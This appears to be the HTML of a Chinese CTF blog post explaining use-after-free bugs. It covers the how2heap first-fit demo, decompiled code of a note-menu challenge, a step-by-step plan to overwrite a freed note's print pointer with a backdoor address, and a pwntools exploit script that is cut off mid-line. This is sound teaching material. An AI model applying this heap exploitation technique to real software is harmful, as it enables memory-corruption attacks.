@@ -1,0 +1,678 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/enter-line.ico">
+  <link rel="icon" href="/img/enter-line.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TKYmax">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="什么是UAFUAF就是Use After Free，简单来说就是释放后再次被使用，分为一下几种情况：  内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UAF漏洞">
+<meta property="og:url" content="http://example.com/2024/08/01/UAF%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="能打八个攻城狮">
+<meta property="og:description" content="什么是UAFUAF就是Use After Free，简单来说就是释放后再次被使用，分为一下几种情况：  内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011605301.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011615307.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011619614.png">
+<meta property="article:published_time" content="2024-08-01T07:47:50.000Z">
+<meta property="article:modified_time" content="2024-08-01T08:53:16.747Z">
+<meta property="article:author" content="TKYmax">
+<meta property="article:tag" content="UAF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011605301.png">
+  
+  
+  
+  <title>UAF漏洞 - 能打八个攻城狮</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>能打八个攻城狮</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="UAF漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-01 15:47" pubdate>
+          2024年8月1日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">UAF漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="什么是UAF"><a href="#什么是UAF" class="headerlink" title="什么是UAF"></a>什么是UAF</h2><p>UAF就是Use After Free，简单来说就是释放后再次被使用，分为一下几种情况：</p>
+<ul>
+<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong></li>
+</ul>
+<p>目前我刚入门只碰见第一种，看别人的博客说后两种比较常见。**我们一般称释放后没有被设置为NULL的内存指针为dangling pointer(悬垂指针)**。</p>
+<p>这里在how2heap上有个实验</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file doesn&#x27;t demonstrate an attack, but shows the nature of glibc&#x27;s allocator.\n&quot;</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This can be exploited in a use-after-free situation.\n&quot;</span>);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);<br>	<span class="hljs-type">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x512</span>);<br>	<span class="hljs-type">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x256</span>);<br>	<span class="hljs-type">char</span>* c;<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(0x512): %p\n&quot;</span>, a);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(0x256): %p\n&quot;</span>, b);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;we could continue mallocing here...\n&quot;</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);<br>	<span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;this is A!&quot;</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br>	<span class="hljs-built_in">free</span>(a);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We don&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;</span>, a);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, let&#x27;s allocate 0x500 bytes\n&quot;</span>);<br>	c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(0x500): %p\n&quot;</span>, c);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);<br>	<span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;this is C!&quot;</span>);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以编译一下做一下这个实验</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>做一个最简单的UAF漏洞的题，初学堆做出来再简单的题都会很有成就感😃。</p>
+<p>下载地址:<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn141_1804">例题</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011605301.png" srcset="/img/loading.gif" lazyload></p>
+<p>一个经典菜单，打开各个功能看一下</p>
+<p>Add note</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">if</span> ( count &lt;= <span class="hljs-number">5</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )<br>      &#123;<br>        *((_DWORD *)&amp;notelist + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);<br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        **((_DWORD **)&amp;notelist + i) = print_note_content;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = *((_DWORD *)&amp;notelist + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size);<br>        <span class="hljs-keyword">if</span> ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + i) + <span class="hljs-number">4</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *(<span class="hljs-type">void</span> **)(*((_DWORD *)&amp;notelist + i) + <span class="hljs-number">4</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++count;<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>申请堆块的时候先申请一个0x8大小的堆块管理，第一个字储存了print函数的地址，第二个字储存堆的内容地址，这个堆块的地址存在notelist中。下面就申请了储存内容的堆。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011615307.png" srcset="/img/loading.gif" lazyload alt="申请堆结构"></p>
+<p>Delete note</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(*((_DWORD *)&amp;notelist + v1) + <span class="hljs-number">4</span>));<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;notelist + v1));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里存在UAF漏洞free掉堆块，但是没有把指针赋值为NULL</p>
+<p>Print note</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">print_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )<br>    (**((<span class="hljs-type">void</span> (__cdecl ***)(_DWORD))&amp;notelist + v1))(*((_DWORD *)&amp;notelist + v1));<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>调用控制堆块的打印函数，传入参数为内容堆块的地址</p>
+<p>存在后门函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011619614.png" srcset="/img/loading.gif" lazyload alt="后门函数"></p>
+<p>我们十分想调用这个诱人且友好的后门函数，但是怎么调用呢，这是个问题，我们知道使用打印内容功能的时候，会调用打印函数，如果调用打印函数的地址改为后门函数的地址那就好了，我们尝试一下</p>
+<p>如果想改变控制堆块的print地址，我们就想办法，把控制堆块变成内容堆块，然后输入后门函数地址覆盖掉print的地址。</p>
+<p>利用思路如下：</p>
+<ul>
+<li>申请note0 大小为0x10(只要大小和控制堆块大小不一样就行)</li>
+<li>申请note1 大小为0x10(同上)</li>
+<li>释放note0</li>
+<li>释放note1</li>
+<li>此时大小为0x10的fast bin中链表为note1 -&gt; note0 </li>
+<li>申请note2 大小为0x8，那么根据堆的分配规则</li>
+<li>note2的控制堆块分配note1的控制堆块，内容堆块分配note0的控制堆块</li>
+<li>这时候我们向note2输入信息，就会储存再note0的控制堆块</li>
+<li>由于我们的note0没有被赋值为NULL，存在UAF漏洞，所以我们还可以使用note0</li>
+<li>当再次掉用note0的打印功能的时候，此时已经被我们覆盖为后门函数，那么就可以直接调用后门函数</li>
+</ul>
+<p>OK了兄弟们，是不是非常神奇，一个简单的题，都要很巧妙的利用</p>
+<p>EXP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn141_1804&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdb.attach(p, gdbscript=<span class="hljs-string">&quot;b * 